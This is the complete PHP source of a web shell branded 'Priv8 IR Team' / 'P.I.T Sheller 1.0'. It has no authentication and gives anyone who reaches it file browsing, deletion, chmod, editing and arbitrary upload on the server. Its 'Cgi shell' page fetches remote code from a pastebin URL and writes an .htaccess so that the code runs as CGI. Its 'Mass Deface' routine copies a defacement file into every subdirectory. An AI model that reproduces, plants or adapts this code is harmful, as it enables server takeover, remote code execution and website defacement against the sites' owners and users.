<?php
error_reporting(0);
if(ini_get("disable_functions")==""){
	$disable_functions="None";
}else{
	$disable_functions=ini_get("disable_functions");
}
if(ini_get("safe_mode")==1){
	$safemode="ON";
}else{
	$safemode="OFF";
}
function formatSizeunits($bytes){
	if($bytes >= 1073741824){
		$bytes= number_format($bytes / 1073741824,2).' GB';
	}elseif($bytes >= 1048576){
		$bytes= number_format($bytes / 1048576,2).' MB';
	
	}elseif($bytes >= 1024){
		$bytes= number_format($bytes / 1024,2).' KB';
	
	}elseif($bytes > 1){
		$bytes = $bytes.' Byte';
	
	}else{
		$bytes = '0 Byte';
	}
	
	return $bytes;


}


if(empty($_GET['page']))
{
	$page="explorer";
}else{
	$page=$_GET['page'];
}
//delete
if(!empty($_GET['del']))
{
	if(is_file($_GET['del']))
	{
		unlink($_GET['del']);
		$path=dirname($_GET['del']);

	}elseif (is_dir($_GET['del'])) {
		$del_dir=@rmdir($_GET['del']);
		$del_dir;
		$path=dirname($_GET['del']);
		if(!$del_dir)
		{
			echo "<script>alert('Directory Not Empty!')</script>";

		}
	}
}
###################
switch (@$_GET['x']) {
	case 'chmod':

	

	if(!empty($_POST['new_perm']) && !empty($_POST['linkfile']))
	{
		$new_perm=$_POST['new_perm'];
		
		chmod($_POST['linkfile'],intval($new_perm,8));
	}case 'edit':
		if(!empty($_POST['link_file']))
		{
			$linkfile1=$_POST['link_file'];
			$new_text=$_POST['editor'];
			$open=fopen($linkfile1,"w+");
			fwrite($open,$new_text);
			fclose($open);
			$path=dirname($_POST['link_file']);
			
		}
		
	
	break;
	case 'renamed':
		if(!empty($_POST['newname_link']) && !empty($_POST['rename']))
		{
			$newname_link=$_POST['newname_link'];
			$rename=dirname($_POST['newname_link'])."/".$_POST['rename'];
			 
			rename($newname_link,$rename);
			$path=dirname($_POST['newname_link']);
			
	}
	break;
}

####
?>
<!DOCTYPE html>
<html>
<head>
	<title>.::Priv8 IR Team::.</title>
	<style type="text/css">
	body{
		font-family: verdana;
		font-size: 12px;
		background-color: #444;

	}
	.priv8_ir_team{
		margin:0 auto;
		width: 700px;
		height: auto;
		background-color: #222;
		border-radius: 3px;
		font-size: 25px;
		font-family: verdana;
		color: lime;
		text-align: center;

	}
	.priv8_ir_team:hover{
		color: red;
		text-shadow: 2px 2px black;
	}
		.main{
			width: 700px;
			height: auto;
			background-color: #bbb;
			margin:0 auto;
			border-radius: 3px;
			font-family: verdana;
			font-size: 12px;
			overflow: auto;
		}
		.information{
			font-family: verdana;
			width: 99%;
			height: auto;
			background-color: #444;
			font-size: 13px;
			color: #fff;
			padding-left: 7px;
			
		}
		span{
			color: green;
			font-family: verdana;
		}
		.option{
			font-family: verdana;
			width: 99%;
			height: 20px;
			color: lime;
			background-color: #333;
			padding-left:7px;
		}
		.a_1{
			font-family: verdana;
			list-style: none;
			color: lime;
			width: 800px;
		}a{
			width: 1000%;
		}
		td{
			width: 140px;
			text-align: center;
		}
		.td_1{
			width: 230px;


		}.td_size{
			width: 80px;
		}.td_perm{
			width: 40px;
		}td{
			width: 330px;
			text-align: left;
		}
		td:hover{
			background-color: #333;
			color: lime;
		}a:hover{
			color: lime;
		}.up{
			margin:0 auto;
			margin-top: 90px;
			width: 380px;
			height: 200px;
			background-color: #333;
			border-radius: 7px;
		}
		.bb{
			font-size: 13px
	}
	.nt{
		
		color: black;
		font-size: 20px;
		font-family: verdana;
		color: green;

	}.chmod_p{
		background-color: #000;
		color: lime;
	}.rename_text{
		background-color: #000;
		color: lime;
	}
	.exp{
		background-color: #fff;
		overflow: scroll;
		height: 470px;
	}
	.opt2{
			height: auto;
			width: 660px;
			background-color: #bbb;
			margin:0 auto;
			border-radius:3px;
			font-family: verdana;
			font-size: 12px;
			overflow: auto;
	}
	.inputdir{
		border-radius: 100%;
		background-color:#000000;
		color: lime;
	}.in2{
		border-radius: 5px;
		font-family: bold;

	}
	.in2:hover{
		background-color: #876;
	}
	</style>
</head>
<body>
<div class="priv8_ir_team">
.::Priv8 IR Team::.<br>
	<b class="bb">Code By NT_Blackhat</b>
	
</div>
<div class="main">
	<div class="information">
		
		 uname : <span><?php echo php_uname(); ?></span><br>
		  Server Ip : <span><?php echo $_SERVER['SERVER_ADDR']; ?></span><br>
		  Your Ip : <span><?php echo $_SERVER['REMOTE_ADDR']; ?></span><br>
		  Safe Mod : <span><?php echo $safemode; ?></span><br>
		  Software : <span><?php echo getenv("SERVER_SOFTWARE"); ?></span><br>
		  Disable Functions : <span><?php echo $disable_functions; ?></span><br>
		  PWD : <span><?php if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
} ?></span>

	</div>
<div class="option">
	<b><a href="?page=explorer" class="a_1">Explorer</a></b>
	<b><a href="?page=terminal" class="a_1">Cgi shell</a></b>
	<b><a href="?page=uploader" class="a_1">Uploader</a></b>
	<b><a href="?page=massdeface" class="a_1">Mass Deface</a></b>
</div>
<div class="exp">
<table>
	<?php
	
		switch ($page) {
			case 'explorer':
				
						$files=scandir($path);
						echo "<table border='3'><tr><th>Name</th><th>Size</th><th>Perm</th><th>D C E</th></tr>";
						foreach($files as $scaner)
						{

							$link=$path."/".$scaner;
							$link=realpath($link);
							if($scaner != ".")
							{

							echo "<tr>";


							
							echo "<td><a href='?page=explorer&path=$link'>$scaner<br></a></td>";

							$file_size=formatSizeunits(filesize($link));
							$perm=substr(decoct(fileperms($link)),-4);
							echo "<td class='td_size'>";
							if(!is_dir($link))
							{
								echo "$file_size";
							}
							echo "</td>";

							echo "<td class='td_perm'>$perm</td>";

							echo "<td class='td_1'>";
											echo "<a href='?page=explorer&del=$link'>Delete</a>&nbsp&nbsp&nbsp";
											
											echo "<a href='?page=chmod&linkfile=$link&p_file=$perm'>Chmod</a>&nbsp&nbsp&nbsp";

											echo "<a href='?page=r_ename&rename=$link'>Rename</a>&nbsp&nbsp&nbsp";
											if(!is_dir($link))
											{
											echo "<a href='?page=edit&edit_file=$link'>Edit</a>";

											}
											
											
							echo "</td>";
							
							echo "</tr>";
							

						}
						

				}
					echo "</table>";	
				break;
			case 'terminal':
			if(!is_dir("cgialfa"))
			{
					mkdir("cgipit");
					$cgi=file_get_contents("https://pastebin.com/raw/6i552sT9");
					$xlink=dirname($_SERVER['SCRIPT_FILENAME']);
					$blink=$xlink."/"."cgipit/cgi.pit";
					$htaccess=$xlink."/"."cgipit/.htaccess";
					$c_cgi=fopen($blink,"w+");
					fwrite($c_cgi,$cgi);
					fclose($c_cgi);
					//htaccess
					$c_htaccess=fopen($htaccess,"w+");
fwrite($c_htaccess,"
Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .pit
AddHandler cgi-script .pit
");
					fclose($c_htaccess);
					chmod($blink,0755);
					$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
					$actual_link = dirname($actual_link)."/cgipit/cgi.pit";
					echo "<a href='$actual_link'><h2>Create Cgi full Success<h2></a>";
			}

                
			break;
			
			case 'uploader':
				?>
				<form method="post" action="" enctype="multipart/form-data">

					<div class="up">
					<br><br>
						&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="file" name="file">
						<input type="submit" name="sup" value="upload"><br><br>
						&nbsp&nbsp&nbsp&nbsp <b>path</b> : <input type="text" name="pathh" value="<?php $up_path=dirname($_SERVER['SCRIPT_FILENAME']); echo $up_path; ?>">
						<?php
						if(isset($_POST['sup']))
						{
							$tmp=$_FILES['file']['tmp_name'];
							$link_up=$_POST['pathh']."/".$_FILES['file']['name'];
							move_uploaded_file($tmp,$link_up);
						}



						?>
					</div>
				</form>

				<?php
			break;
			case 'chmod':
			if(!empty($_GET['linkfile']) && !empty($_GET['p_file']))
			 $pathx=dirname($_GET['linkfile']);

			{
					?>
						<form method="post" action="?x=chmod&path=<?php echo $pathx; ?>">
						New Perm :<input type="text" name="new_perm" value="<?php echo $_GET['p_file']; ?>" class="chmod_p">
						<input type="hidden" name="linkfile" value="<?php echo $_GET['linkfile']; ?>" >
						<input type="submit" value="chmod" class="chmod_p">

						</form>
					<?php
			}
			break;
			case 'edit':
			if(!empty($_GET['edit_file']))
			{
			 $pathxx=dirname($_GET['edit_file']);
			?>
<form method="post" action="?x=edit&path=<?php echo $pathxx; ?>">
<textarea rows="25" cols="85" name="editor">
<?php $x=htmlspecialchars(file_get_contents($_GET['edit_file']));  

echo $x;
?>
</textarea><br>
<input type="submit" name="save" value="Save">
<input type="hidden" name="link_file" value="<?php echo $_GET['edit_file']; ?>">
</form>

				<?php
			}



			break;

			case 'r_ename':
				if(!empty($_GET['rename']))
					
				{
					$pathxxx = dirname($_GET['rename']);
					?>
					<form method="post" action="?x=renamed&path=<?php echo $pathxxx; ?>">
					<br>
					path : <span><?php echo $_GET['rename']; ?></span><br><br>
					<input type="hidden" name="newname_link" value="<?php echo $_GET['rename']; ?>">
					New Name : <input type="text" name="rename" class="rename_text">
					<input type="submit" name="subrename" value="Change" class="rename_text">	


					</form>


					<?php
				}
			break;
################################################mass Deface##################
			case 'massdeface':
echo "<center><textarea placeholder='Results will be here..' rows='15' cols='100' style='background-color:#333; color:lime'>";
if(isset($_POST['execmassdeface']))
{
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
$filename = $_POST['filename'];
echo $dir."\n";
if (is_dir($dir)) {
if ($dh = opendir($dir)) {
while (($file = readdir($dh)) !== false) {
if(filetype($dir.$file)=="dir"){
$newfile=$dir.$file."/".$filename;
echo $newfile."\n";
if (!copy($defaceurl, $newfile)) {
echo "failed to copy $file...\n";
}
}
}
closedir($dh);
}
}
}
echo "</textarea></center>";
?>

<center>

<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'><br>
	<table>


	 <tr><td>[+] path </td><td><input type='text' style='width: 400px' value='<?php echo getcwd() . "/"; ?>' name='massdefacedir'></td></tr>
	 <tr><td>[+] path Deface</td><td><input type='text' style='width: 400px' name='massdefaceurl' value="<?php echo getcwd(); ?>"></td></tr>
	 <tr><td>[+] Nama File </td><td><input type='text' style='width: 400px' name='filename' value='priv8irteam.php'></td></tr>
     <tr><td><input type='submit' name='execmassdeface' value='>>' style="width: 100px"></td></tr>
</form>

</table>


<?php

			break;

#####################################################################
			default:
				echo "Page Not Found!";
				break;
		}
		
?>
</table>
</div>

</div>
<dir class="opt2">
<form action="?path=<?php echo getcwd(); ?>" method="post">
	<table class="tb2">

		<b>Mkdir</b>&nbsp<input class="in2" type="text" name="mkdir">&nbsp<input type="submit" name="mkdirsub" value=">>" class="inputdir">&nbsp&nbsp&nbsp&nbsp<b>File</b>&nbsp<input class="in2" type="text" name="filec">&nbsp<input type="submit" name="filesub" value=">>" class="inputdir">&nbsp&nbsp&nbsp&nbsp&nbsp<b><a href="https://telegram.me/priv8_ir_team">Prvi8 Ir Team | Channel</a></b>
		

	</table>
<?php 
$path1 = $_GET['path'];
if(isset($_POST['mkdirsub']))
{
	$folder = $path1."/".$_POST['mkdir'];
	mkdir($folder);
}elseif (isset($_POST['filesub']))
{
	$file1 = $path1."/".$_POST['filec'];


	file_put_contents($file1,"");
}
?>
</form>
	</dir>
<center>
<h2 class="nt">./Nt.Blackhat P.I.T Sheller 1.0</h2>
</center>
</body>
</html>
